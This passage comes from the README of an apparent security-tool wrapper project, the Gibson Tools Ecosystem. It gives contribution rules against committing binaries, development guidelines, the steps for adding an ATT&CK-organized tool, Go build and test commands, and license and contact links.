# Build specific tool
cd discovery/nmap && go build -o nmap .
```

#### What This Means for Contributors

- **DO NOT** commit compiled binaries, executables, or shared libraries
- **DO NOT** commit files in `bin/` directories
- **DO NOT** commit `.exe`, `.dll`, `.so`, `.dylib`, or other binary formats
- **DO** commit only source code (`.go`, `.py`, `.yaml`, `.json`, etc.)
- **DO** ensure all tools can be built from source using documented build commands

The `.gitignore` is configured to reject binary files. If you accidentally commit a binary, remove it immediately and update your PR.

---

## Contributing

We welcome contributions to the Gibson Tools Ecosystem!

### Development Guidelines

1. **Follow Standard Pattern**: All tools must follow the standard implementation pattern defined in the design document
2. **Schema Validation**: Define comprehensive input/output schemas
3. **Health Checks**: Implement health checks verifying all dependencies
4. **Error Handling**: Use structured error types from `pkg/common`
5. **Testing**: Include unit tests and integration tests
6. **Documentation**: Document ATT&CK mappings and usage examples

### Adding a New Tool

1. Create tool directory under appropriate ATT&CK phase
2. Implement `tool.go`, `schema.go`, `main.go`
3. Add to `go.work`
4. Write tests
5. Document in README with examples
6. Submit pull request

### Running Tests

```bash
# Run all unit tests
go test ./...

# Run integration tests
go test -tags=integration ./...

# Run specific tool tests
cd reconnaissance/nmap
go test -v
```

## License

The Gibson Tools Ecosystem is released under the MIT License. See LICENSE file for details.

Individual wrapped tools retain their original licenses. Please review each tool's license before use.

---

**Questions or Issues?**

- GitHub Issues: https://github.com/zero-day-ai/gibson-tools-official/issues
- Gibson Framework: https://github.com/zero-day-ai/gibson
- Documentation: https://docs.gibson.ai
- Community: https://community.gibson.ai
